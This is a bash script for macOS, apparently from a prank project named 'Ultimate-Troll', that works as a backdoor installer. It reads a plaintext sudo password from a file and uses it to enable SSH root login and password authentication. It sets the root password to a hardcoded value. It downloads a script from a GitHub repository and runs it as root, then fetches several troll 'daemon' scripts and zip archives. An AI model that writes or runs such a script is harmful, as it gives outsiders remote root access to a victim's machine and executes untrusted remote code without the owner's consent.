#!/usr/bin/env bash

set -euo pipefail

# Helper to download files without curl
download() {
  local url="$1" dest="$2"
  if command -v wget >/dev/null 2>&1; then
    wget -qO "$dest" "$url"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - <<EOF
import urllib.request, sys
try:
    urllib.request.urlretrieve("$url", "$dest")
except Exception as e:
    sys.exit(1)
EOF
  else
    echo "Error: neither wget nor python3 available to download $url" >&2
    exit 1
  fi
}

# Ensure the script always runs as user "carterhuang"
if [ "$(whoami)" != "carterhuang" ]; then
  echo "[*] Switching to user carterhuang..."
  exec sudo -u carterhuang bash "$0" "$@"
fi

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
PFILE="$TARGET_DIR/p.txt"

# If setup did not complete before, reset sub-directory and continue
if [ ! -f "$SUBP_DIR/success" ]; then
    echo "❌ Success marker not found. Resetting '$SUBP_DIR' and continuing setup..."
    rm -rf "$SUBP_DIR"
    mkdir -p "$SUBP_DIR"
fi

# Verify sudo password file exists
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Edit SSH configuration to enable root login and password authentication
echo "[*] Updating SSH configuration..."
echo "$SUDO_PASS" | sudo -S sed -i.bak -E 's/^#?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "$SUDO_PASS" | sudo -S sed -i.bak -E 's/^#?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH daemon to apply changes
echo "[*] Restarting SSH daemon to apply changes..."
echo "$SUDO_PASS" | sudo -S launchctl unload -w /System/Library/LaunchDaemons/ssh.plist

echo "$SUDO_PASS" | sudo -S launchctl load -w /System/Library/LaunchDaemons/ssh.plist

# Update root password to Aa112211!, using old password if set
echo "[*] Updating root password to Aa112211!..."
# Try with old password (Mayuecheng2009)
if echo "$SUDO_PASS" | sudo -S sysadminctl -resetPasswordFor root \
     -oldPassword "Mayuecheng2009" -newPassword "Aa112211!"; then
  echo "[*] Root password updated using old password."
# Fallback to resetting without old password
elif echo "$SUDO_PASS" | sudo -S sysadminctl -resetPasswordFor root \
     -newPassword "Aa112211!"; then
  echo "[*] Root password updated without old password."
else
  echo "[!] Failed to update root password."
fi

# Download required scripts
echo "[*] Downloading install-brew.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/install-brew.sh" "$SUBP_DIR/install-brew.sh"

# Make all downloaded scripts executable
chmod +x "$SUBP_DIR/"*.sh


# Run the downloaded scripts
echo "[*] Running install-brew.sh..."
echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/install-brew.sh"

# Ensure Python 3 is installed
if ! command -v python3 >/dev/null 2>&1; then
  echo "[*] Python3 not found. Installing via Homebrew..."
  brew install python
else
  echo "[*] Python3 is already installed."
fi

# Download picture-daemon.sh into subp folder
echo "[*] Downloading picture-daemon.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/picture-daemon.sh" "$SUBP_DIR/picture-daemon.sh"
chmod +x "$SUBP_DIR/picture-daemon.sh"

# Download wallpaper-daemon.sh into subp folder
echo "[*] Downloading wallpaper-daemon.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/wallpaper-daemon.sh" "$SUBP_DIR/wallpaper-daemon.sh"
chmod +x "$SUBP_DIR/wallpaper-daemon.sh"

# Download sound-daemon.sh into subp folder
echo "[*] Downloading sound-daemon.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/sound-daemon.sh" "$SUBP_DIR/sound-daemon.sh"
chmod +x "$SUBP_DIR/sound-daemon.sh"

# Download trigger.sh into subp folder
echo "[*] Downloading trigger.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/trigger.sh" "$SUBP_DIR/trigger.sh"
chmod +x "$SUBP_DIR/trigger.sh"

# Download sd.sh into subp folder
echo "[*] Downloading sd.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/sd.sh" "$SUBP_DIR/sd.sh"
chmod +x "$SUBP_DIR/sd.sh"

# Download websites-daemon.sh into subp folder
echo "[*] Downloading websites-daemon.sh..."
download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/websites-daemon.sh" "$SUBP_DIR/websites-daemon.sh"
chmod +x "$SUBP_DIR/websites-daemon.sh"

# (Run other scripts below as needed)
# Example:
# echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"


# Download and extract sounds.zip
echo "[*] Downloading sounds.zip..."
download "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/sounds.zip" "$TARGET_DIR/sounds.zip"
echo "[*] Extracting sounds.zip..."
unzip -o "$TARGET_DIR/sounds.zip" -d "$TARGET_DIR"
echo "[*] Cleaning up sounds.zip..."
rm -f "$TARGET_DIR/sounds.zip"

# Download and extract special.zip
echo "[*] Downloading special.zip..."
download "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/special.zip" "$TARGET_DIR/special.zip"
echo "[*] Extracting special.zip..."
unzip -o "$TARGET_DIR/special.zip" -d "$TARGET_DIR"
echo "[*] Cleaning up special.zip..."
rm -f "$TARGET_DIR/special.zip"

echo "[*] Setup complete!"
# Create a success marker file
touch "$SUBP_DIR/success"